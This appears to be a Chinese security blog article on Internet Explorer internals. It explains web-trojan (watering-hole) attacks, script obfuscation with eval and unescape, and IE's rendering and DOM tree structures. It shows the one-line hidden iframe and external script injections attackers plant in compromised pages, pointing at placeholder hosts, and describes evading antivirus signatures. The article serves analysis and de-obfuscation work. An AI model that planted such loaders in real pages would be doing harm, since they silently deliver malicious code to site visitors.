# IE安全系列：IE的自我介绍 （II）

本篇依然是三段

II.1 介绍一些基础概念和简单实现

II.2介绍一些实用操作

II.3介绍IE对某些内容实现的具体细节

三节的内容并不是强联系，需要了解的内容也并不相同，跳过一节并不会影响到其他内容的理解，请根据需要来阅读。

II.1 HTML与网马攻击
==============

* * *

跟龙总（@瞌睡龙）商量了一下更换了大纲顺序，所以本来放在后面的网马解密决定放在前面和HTML、Javascript一起来说了。现阶段网马大部分都是工具生成的，由于基本都是傻瓜式操作，买个站挂上，再批量拿下其它站来插代码就好了，所以导致攻击量居高不下。

这个问题在2007年附近尤其盛行，当时由于IE6的占有量巨大，而IE6又是一个安全问题频发的浏览器版本，加上盗版系统的占有率高，自动安装补丁的用户少，所以网马攻击很常见，大家经常会发现用着用着突然浏览器内存占用就升高了很多，这时候用户很可能就已经受到了攻击。

当然，随着Windows Vista的发布和许多新功能的加入，从IE9开始，此类问题已经逐渐得到了改善，但是显而易见的是，微软只是在逐渐提高攻击者的攻击门槛，从根本上看，每个厂商和软件都不太可能消除用户环境中各种原因产生的安全问题。

当时（2007）网马已经较为成熟，各种加密（或者专业一些，称作混淆，obfuscation）层出不穷，为了应付，当时我还做了一个工具叫Redoce，用户体验几乎没有，不嫌难用的也可以试试（本来想C++重写这个工具的，可惜时间不允许了）。

![enter image description here](http://drops.javaweb.org/uploads/images/f767fc93ec390fc4390dfea520d76671e3ce5e06.jpg)

图：国外各种Exploit Kit提供支持的漏洞利用代码

网马攻击，或者专业点称为“水坑式攻击”（Watering Hole Attack），是它的一个子集，水坑式攻击这个词应该是从2012年RSA Security处诞生的，意义是针对要攻击的人群，分析他们的习惯之后，在他们可能访问的网站上挂马，这些马可以是浏览器漏洞，钓鱼等等。

水坑攻击中关于钓鱼、欺骗的部分我暂且不提了，剩余部分，网马的代码一般涉及两个部分，一个是代码混淆，一个是漏洞利用。很简单，由于杀毒软件都有各种网盾之类的扫描机制，包括IE访问时还会产生本地缓存文件，如果不对利用代码进行免杀的话，凭借特征库，杀毒软件很容易就能检测到当前页面有恶意代码。

![enter image description here](http://drops.javaweb.org/uploads/images/44342ef405b3daed3c3a1bb716d425d21589054a.jpg)

图：某个Exploit Kit中提供的各种利用代码

漏洞利用部分，“解密”一词倒是有多重含义，取决于你需要怎么处置这段利用代码。常见的可以总结如下：

*   找到挂马的页面要下载什么木马，这个是最简单也是很常见的需求；
    
*   了解Shellcode部分是如何在各个系统正常运作的，这个也不是多难，因为分析点只需要集中在一大堆Shellcode部分即可；
    
*   完整分析漏洞，这个可能出现在你被0day给“水坑”了，而且你也对这个漏洞很好奇的时候，或者其他目的；
    

代码混淆部分，最初释放出的代码可能只有简单的混淆，例如变量名置换等等，但是后期漏洞利用代码一旦暴露时间增长，则挂马者为了躲避杀毒软件检测，会对代码进行各种加密。 但是肯定离不开代码的这一个单位：函数。

总的来说，网马的解密就是要靠眼睛，即使中间加密再牛，最后也无非就是一两招就能拆掉的。偶尔把自己当参数解密的这类难度系数可能会高上一层，但是也只是多费时间而已。

![enter image description here](http://drops.javaweb.org/uploads/images/57e243e4e4abe29bd15ec02ab0d222f20ba682c3.jpg)

图：某个Exploit Kit提供的漏洞利用脚本

网页挂马的方式最常见的就是通过注入代码，黑阔们可能会使用软件批量扫站，取得写入权限后向网页内注入恶意脚本。

通常，由于注入一大片脚本会导致文件大小突然变大很多，这样将很容易被发现，所以通常攻击者注入的都是简短的一行：

```
<iframe src=”http://something.eval”  width= 0 height=0/>

```

或者

```
<script src=”http://also.something.eval” />

```

这样，当用户访问当前网页时就会自动加载起攻击者的网页或者脚本。在早期的网马中，通常width / height 的值很小，或者iframe、script出现在html标记之前或者/html标记之后都会被认为是恶意的。后来逐渐发展，由国外的Exploit Toolkit带起来动态创建元素、302跳转。 以及国内网马也开始用Style标记隐藏元素，以及其他做法都出现了。

关于网马的提供源，可见参考资料(1)。最近几篇中，将穿插着同时介绍HTML，以及相关的网马知识，至于SWF、PDF之类的，将放在后面提一提。

由于这是本篇的最开始，所以我们先简单的介绍几个元素：

1. IFRAME
---------

* * *

![enter image description here](http://drops.javaweb.org/uploads/images/6d74ff2ae5f9bc10450b737918c2d0f85a8881e3.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/b0dc013315d99e6e6d04aa7241b57aafcaacd8c7.jpg)

图：IFRAME在IE中的显示效果

以上为一个IFRAME，用途是在当前网页内再用“框架”显示一个网页，这是最常见的。FRAMESET（+ FRAME）也可以做到。上图中alert部分的代码会在当前域执行。

FRAME相当于一个独立的网页，它（FRAME）的宿主是外层网页，它（FRAME）的内部元素宿主是该FRAME自身。如果需要配合body onload等事件触发漏洞的话，选择iframe将是一个不错的计划。

2. SCRIPT
---------

* * *

SCRIPT标签通过src可以加载一个存放于外部网站的脚本，这对控制网马攻击并插入当前网站的恶意代码的量有显著的作用。恶意利用代码的长度通常都不短，直接写入的话可能导致当前网站文件大小异常，或者流经网络的流量异常，从而被管理员很快发现。

简短的脚本也可以直接写入，例如几年前最为流行的MS06-014（CVE-2006-0003）漏洞。作用域为当前域。

然后，针对代码的混淆，假定各位已经掌握了基础的JavaScript/VBScript的相关知识，如果没有可以参考W3School的相关教程。我们先来认识一组函数，这组函数提供了加密/编码的功能：

```
unescape/ escape

```

这对函数互为逆反。

该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。(2)

在脚本引擎中该函数的实现为：逐字搜索%，找到后对后续内容进行有效性检查（“u”开始？ 是否都为16进制数字？），满足条件后，用对应字符替换%序列。

```
eval

```

这个函数可以将字符串转为代码来执行，例如默认情况下，eval(“alert(5)”)等价于alert(5)。同样有这个功能的函数还有setTimeout、setInterval （第一个参数传入字符串的情况下）。

为什么要介绍这个函数呢，因为字符串的加密才是网马混淆的重点所在，因为很有可能会出现这样的代码：

```
eval(decrypt_function(“ENCRYPTED_STRING”));

```

而此时，eval就是整个去混淆的突破口。

II.2 网页渲染概述
===========

* * *

浏览器中显示的花花绿绿的各种内容，基础单位是什么呢？上一篇中我们也提到了HTML，既然它是能让浏览器操作一组“Markup”的语言，那么Markup必然有自己更详细的实现，这个实现又是什么呢？粗略地说，这个实现就是元素（Element）。

如果有人用过使用基于XML的UI界面之类的库，相信大家会更加容易理解元素是怎么呈现在网页上的。不过IE的网页并没有简单的重用系统的基本窗口类，而是自行弄了一套逻辑。如果你试图使用Spy++来查看IE的话，你会发现只有一个Internet Explorer_Server的区域在这里。

而且使用Spy++跟踪Internet Explorer_Server的消息时，几乎看不见WM_CREATE窗口创建的消息，有的全部是WM_PAINT和各种自定义消息。

![enter image description here](http://drops.javaweb.org/uploads/images/d8de13b8ea81c8996cb514fb423bf46ef24c527e.jpg)

图：Spy++观察IE窗口

使用WebBrowser也可以得到这个对象。

![enter image description here](http://drops.javaweb.org/uploads/images/e3fc8ab7e7733ef6c3fdbccbc4c84f93b07c79a3.jpg)

图：WebBrowser控件的结构和IE的窗口相似

那窗口上那各种各样的元素是怎么显示出来的呢？答案是“自绘”的，IE的页面上并不是标准的Windows窗口。

如果无法理解，可以类比一下QQ主界面，感受两下。与IE渲染相关的类十分之多，这块与安全关系不大，牵扯到的代码量也很大，最基础的可以从CFormDrawInfo（获取绘制信息）、CSetDrawSurface（设置绘图区域）、CCalcInfo（计算Site大小）这些以及相关的类跟踪一下，它们是用于计算绘图相关的类，还有文字排版、具体的绘制等内容分列在其他许多代码中，现在也暂且不谈。对页面渲染有兴趣的话可以直接参考Chrome的代码，虽然他和IE用的不是一套，但是这样更能受到启发。

![enter image description here](http://drops.javaweb.org/uploads/images/4b5df445ae66b098f86e8ae132e3a1ac79f7431e.jpg)

图：IE9的渲染逻辑概括

II.3节点的结构
=========

* * *

既然HTML通过各个元素来展示，那么元素在IE中必然有更严格的层级结构和管理模式，这个模式是什么样的呢？

IE中几乎每个看得见摸得着的标签都对应着一个类，例如`<a>`（超链接锚）对应的是CAnchorElement。这些细分的类都是由CElement派生而来，而CElement则是由CBase派生而来。 这些子元素以元素树的方式存在着。针对DOM，IE会在内部维护一个伸展树（Splay Tree）。首先让我们看一看一些这棵树基础的构成。

上一篇我们说到CMarkupPointer，这个是Markup Service的“指针”，那基于树的模型中，树的指针是什么呢？答案是CTreePos。

在IE中，层级结构类似于：

![enter image description here](http://drops.javaweb.org/uploads/images/bf95b46c3ec844a842e208c46e7de6f79f52368e.jpg)

详细的描述一下上图。每一页（CDoc）都会有一个Primary Markup，该Primary Markup（CMarkup）指向当前Root Element（CElement）。

每个CMarkup会和某个Doc（CDoc）关联起来，这个关联关系体现在CMarkup的成员变量中，有一个CDoc*即为其相关的Document。

CMarkup会和Root Element相关联（），CElement遍历树中元素（其实是节点node，方便理解说成元素了）要从First Branch开始，通常CElement中已经存储了First Branch Node。 可以通过CElement::contains(...)来简单理解一下这个过程，函数的功能是：判断某个CElement的子树中是否包含某个元素，（以下是简化的流程）：

*   1 从参数中获取CTreeNode_，如果无法获取，则获取要判断是否被包含的这个元素（CElement）的First Branch（注：GetFirstBranch()的返回值是CTreeNode_）。
    
*   2 从 1 步获得的这个Node开始向上遍历，直至遍历到根Node，或者当前Node为止；
    
*   3如果 2 步的结果是遍历到了根Node，那么返回VB_FALSE，如果是遍历到了当前Node，返回VB_TRUE，这个逻辑大致是：
    

![enter image description here](http://drops.javaweb.org/uploads/images/58ed77da8e83ee7cef7219283f7c4a89f3f50b68.jpg)

同样，每个CTreeNode可以是与CElement关联的（它也可以谁都不关联，称为未初始化的，也可以与文本关联）。而CTreePos即为描述CTreeNode的位置“指针”，CTreePos要描述的是节点在“树中的位置”。

在一个CTreeNode的视野中，起始节点称为Begin Tree Pos（NodeBeg），最后的节点称为End Tree Pos（NodeEnd）。

CMarkupPointer可以返回与之绑定在一起的节点的CTreePos，但是返回的并不一定都是绑定着的，也有可能是因为无效操作或者被移除等其他情况导致的未定义的位置。

最后，重提一下上一页中出现的“元素交叉”的情况，这个情况在Javascript中又是怎么处理的呢？大家可以试验一下，查看一下不同IE版本之间渲染的细微差别：

```
<div>wwww<b>xxxxx<i>yyyy</b>zzzzz</i>wwww</div>

<script>
    alert("begin..");

    var nodes = document.all;  
    for(var i=0;i<nodes.length;i++){  
        var o = nodes[i];  
        console.log(o.tagName + ',' + o.nodeType + ',' + o.sourceIndex + " : Parent is " + o.parentNode.nodeName);  
    }  
</script>

```

在IE8中，是：

![enter image description here](http://drops.javaweb.org/uploads/images/f28da66bf18e27ef80827c785931f20379a563c8.jpg)

图：请看zzzzz被重复了两次

IE8的输出结果是：

![enter image description here](http://drops.javaweb.org/uploads/images/27936a719093ad09f5aa5da930f9c059603b8cd0.jpg)

而同样的代码，在IE11中则是：

输出的结果是： HTML1523: 重叠的结束标记。标记的结构应为

```
"<b><i></i></b>"

```

而不是

```
"<b><i></b></i>"。

```

文件: hp.htm，行: 1，列: 25

```
HTML,1,0 : Parent is #document
HEAD,1,1 : Parent is HTML
BODY,1,2 : Parent is HTML
DIV,1,3 : Parent is BODY
B,1,4 : Parent is DIV
I,1,5 : Parent is B
I,1,6 : Parent is DIV
SCRIPT,1,7 : Parent is BODY

```

可见这里元素被细分为了：

```
<div>wwww<b>xxxxx<i>yyyy</i></b><i>zzzzz</i>wwww</div>  

```

可见，IE8中元素I的区域明显异于IE11。IE11中为什么有如此改动呢？对比一下Chrome的结果即可知晓：

![enter image description here](http://drops.javaweb.org/uploads/images/3070daff6bac2afe79659887e3710376c984c9ad.jpg)

对比可见IE11的输出和Chrome其实一样，在元素发生交叉时，将逻辑修改成了：重叠区域拆分成多个元素，而不是一直保持原始输入不变。

![enter image description here](http://drops.javaweb.org/uploads/images/10bb627a28d6893bd02ddfbd8281e440e8c63d43.jpg)

以上是Chrome的控制台结果，为了消除浏览器间的差异性，修改后的IE11的运行结果和Chrome变得一样了。

参考资料 & 可供参考的资料
==============

* * *

(1] http://bbs.kafan.cn/forum-105-1.html

(2] http://www.w3school.com.cn/jsref/jsref_unescape.asp

(3] http://contagiodata.blogspot.com/

(4] http://www.iefans.net/ie9-tuxingjiasu/

(5] http://spmblog.dynatrace.com/2009/12/12/uderstanding-internet-explorer-rendering-behaviour/